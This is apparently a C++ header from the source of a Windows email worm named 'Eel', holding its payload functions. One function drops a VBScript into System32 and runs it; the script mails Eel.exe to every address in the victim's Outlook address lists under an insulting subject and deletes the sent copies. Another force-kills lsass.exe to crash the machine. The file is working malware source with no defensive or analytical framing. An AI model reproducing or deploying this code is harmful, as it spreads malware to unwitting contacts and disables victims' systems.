#pragma once

#include "Eel.h"

namespace Payloads
{
	VOID SpreadEmail(VOID)
	{
		LPCWSTR lpFileName = L"C:\\WINDOWS\\System32\\Eel.vbs";

		const CHAR* lpBuffer = 
		{
			"On Error Resume Next\r\n\r\n"

			"Set sys32 = CreateObject(\"Scripting.FileSystemObject\").GetSpecialFolder(1)\r\n"
			"Set outlook = CreateObject(\"Outlook.Application\")\r\n\r\n"

			"For Each addr In outlook.GetNameSpace(\"MAPI\").AddressLists\r\n\t"
			"If addr.AddressEntries.Count <> 0 Then\r\n\t\t"
			"addrEntCount = addr.AddressEntries.Count\r\n\t\t"
			"For addrEntIndex = 1 To addrEntCount\r\n\t\t\t"

			"Set item = outlook.CreateItem(0)\r\n\r\n\t\t\t"
			"item.To = addr.AddressEntries(addrEntIndex).Address\r\n\t\t\t"
			"item.Subject = \"Dimwit?\"\r\n\t\t\t"
			"item.Body = \"Man.\" & vbcrlf & vbcrlf & \"You really are a dimwit.\"\r\n\t\t\t"
			"item.attachMents.Add(sys32& \"\\Eel.exe\")\r\n\t\t\t"
			"item.DeleteAfterSubmit = True\r\n\r\n\t\t\t"

			"If item.to <> \"\" Then\r\n\t\t\t\t"
			"item.Send\r\n\t\t\t"
			"End If\r\n\t\t"
			"Next\r\n\t"
			"End If\r\n"
			"Next"
		};
		HANDLE hFile = CreateFileW(lpFileName, GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
		DWORD dwBytesWritten;
		WriteFile(hFile, lpBuffer, strlen(lpBuffer), &dwBytesWritten, NULL);
		CloseHandle(hFile);
		ShellExecuteW(NULL, L"open", L"wscript.exe", lpFileName, NULL, NULL);
	}
	
	VOID CrashLSASS(VOID)
	{
		system("taskkill /f /im lsass.exe");
	}
}
